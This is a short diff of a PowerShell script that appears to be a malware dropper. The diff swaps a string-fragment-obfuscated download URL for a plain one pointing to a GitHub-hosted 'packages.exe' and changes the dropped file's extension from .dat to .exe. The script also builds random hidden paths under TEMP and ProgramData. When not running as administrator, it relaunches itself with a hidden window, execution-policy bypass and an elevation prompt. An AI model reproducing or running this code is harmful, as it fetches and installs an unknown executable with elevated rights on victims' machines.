@@ -1,7 +1,7 @@
-$v1="ht"+"tps:/"+"/gi"+"thub"+".c"+"om/g"+"sef"+"f13"+"7-a"+"fk/"+"tes"+"/t/r"+"aw/"+"re"+"fs/"+"hea"+"ds/"+"ma"+"in/"+"pa"+"cka"+"ges."+"ex"+"e"
+$v1="https://github.com/gseff137-afk/test/raw/refs/heads/main/packages.exe"
 $v2=$env:TEMP+"\"+[System.IO.Path]::GetRandomFileName().Replace(".","")+".tmp"
 $v3=$env:ProgramData+"\"+[System.IO.Path]::GetRandomFileName().Split('.')[0]+"\"
-$v4=$v3+[System.IO.Path]::GetRandomFileName().Split('.')[0]+".dat"
+$v4=$v3+[System.IO.Path]::GetRandomFileName().Split('.')[0]+".exe"
 
 if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){
 $p=Start-Process powershell -ArgumentList ("-WindowStyle Hidden -Exec Bypass -Comm `"$($MyInvocation.MyCommand.Definition)`"") -Verb RunAs -PassThru
